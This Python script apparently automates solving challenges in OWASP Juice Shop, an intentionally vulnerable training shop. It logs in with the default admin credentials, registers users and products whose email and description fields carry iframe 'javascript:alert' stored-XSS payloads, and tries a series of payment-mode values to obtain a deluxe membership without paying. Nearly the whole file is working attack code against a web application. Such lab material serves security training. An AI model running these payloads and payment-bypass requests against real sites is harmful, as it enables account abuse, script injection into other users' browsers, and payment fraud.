from core.client import JuiceShopClient
from loguru import logger
import time
import random

client = JuiceShopClient()

def brute_persisted_user():
    logger.info("Brute forcing Persisted XSS User...")
    payloads = [
        '<iframe src="javascript:alert(xss)">',
        "<iframe src='javascript:alert(xss)'>",
        '<iframe src="javascript:alert(\'xss\')">',
        '<iframe src="javascript:alert(`xss`)">'
    ]
    
    for p in payloads:
        email = f"{p}{random.randint(10000,99999)}@test.com" # Append random to be unique
        # Try inserting randomness inside tag? <iframe ... id="random">
        # Or try clean payload and rely on random suffix
        
        # 1. Suffix
        try_payload = {
            "email": email,
            "password": "password123",
            "passwordRepeat": "password123",
            "securityQuestion": {"id": 1, "answer": "answer"}
        }
        client.post("/api/Users", json=try_payload)
        
        # 2. Inside Tag (if parser allows)
        email_inside = p.replace(">", f' id="{random.randint(1000,9999)}">')
        try_payload_2 = {
            "email": email_inside,
            "password": "password123",
            "passwordRepeat": "password123",
            "securityQuestion": {"id": 1, "answer": "answer"}
        }
        client.post("/api/Users", json=try_payload_2)

def brute_restful_xss():
    logger.info("Brute forcing Restful XSS...")
    # Login
    login_res = client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
    token = login_res.json().get("authentication", {}).get("token")
    if not token: return
    headers = {"Authorization": f"Bearer {token}"}
    
    payloads = [
        '<iframe src="javascript:alert(xss)">',
        "<iframe src='javascript:alert(xss)'>",
        '<iframe src="javascript:alert(\'xss\')">',
        '<iframe src="javascript:alert(`xss`)">'
    ]
    
    for p in payloads:
        data = {
            "name": f"XSS_{random.randint(1000,9999)}",
            "description": p,
            "price": 100,
            "image": "xss.png"
        }
        client.post("/api/Products", json=data, headers=headers)

def brute_deluxe_fraud():
    logger.info("Brute forcing Deluxe Fraud...")
    login_res = client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
    token = login_res.json().get("authentication", {}).get("token")
    if not token: return
    headers = {"Authorization": f"Bearer {token}"}
    
    # Modes to try
    modes = [None, "null", "undefined", "", "wallet", "card"] # 'wallet' might work if balance check is bypassed?
    
    for m in modes:
        payload = {"paymentMode": m, "paymentId": "1"}
        client.post("/rest/deluxe-membership", json=payload, headers=headers)
        
        # Also try omitting paymentMode
        payload_omit = {"paymentId": "1"}
        client.post("/rest/deluxe-membership", json=payload_omit, headers=headers)

if __name__ == "__main__":
    brute_persisted_user()
    brute_restful_xss()
    brute_deluxe_fraud()
